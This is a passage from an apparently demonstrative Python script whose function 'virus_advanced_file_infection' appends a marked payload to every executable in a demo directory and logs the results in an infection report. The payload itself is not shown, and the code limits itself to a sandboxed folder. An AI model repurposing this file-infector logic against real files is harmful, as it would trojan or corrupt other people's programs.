        root.relative_to(target_root)
        root.mkdir(parents=True, exist_ok=True)
    except (OSError, ValueError):
        return

    report = []
    payload = payload_code if payload_code.startswith("\n" + marker) else (
        "\n" + marker + "\n" + payload_code.lstrip("\n")
    )

    for path in scan_directory_for_executables(root):
        entry = {"path": str(path), "status": "skipped"}
        try:
            original = path.read_text(encoding="utf-8")
            if marker in original:
                entry["status"] = "already_marked"
            else:
                path.write_text(original + payload, encoding="utf-8")
                entry["status"] = "appended"

            metadata = path.with_name(path.name + ".metadata.json")
            metadata.write_text(
                json.dumps(
                    {
                        "managed_by": "benign_demo_fixture",
                        "marker": marker,
                        "mode": stat.S_IMODE(path.stat().st_mode),
                        "updated": True,
                    },
                    indent=2,
                    sort_keys=True,
                )
                + "\n",
                encoding="utf-8",
            )
            entry["metadata"] = str(metadata)
        except (OSError, UnicodeError) as exc:
            entry["status"] = "error"
            entry["error"] = str(exc)
        report.append(entry)

    (TARGET / "infection_report.json").write_text(
        json.dumps(report, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def main() -> int:
    try:
        TARGET.mkdir(parents=True, exist_ok=True)
        _ensure_demo_files()

        payload = _safe_payload()
        virus_advanced_file_infection(
            str(DEMO_DIR),
            payload,
            MARKER,
        )

        (TARGET / "run_manifest.json").write_text(
            json.dumps(
                {
                    "directory": str(DEMO_DIR),
                    "marker": MARKER,
                    "completed": True,
                },
                indent=2,
                sort_keys=True,
            )
            + "\n",
            encoding="utf-8",
        )
    except Exception:
        pass
    return 0


if __name__ == "__main__":
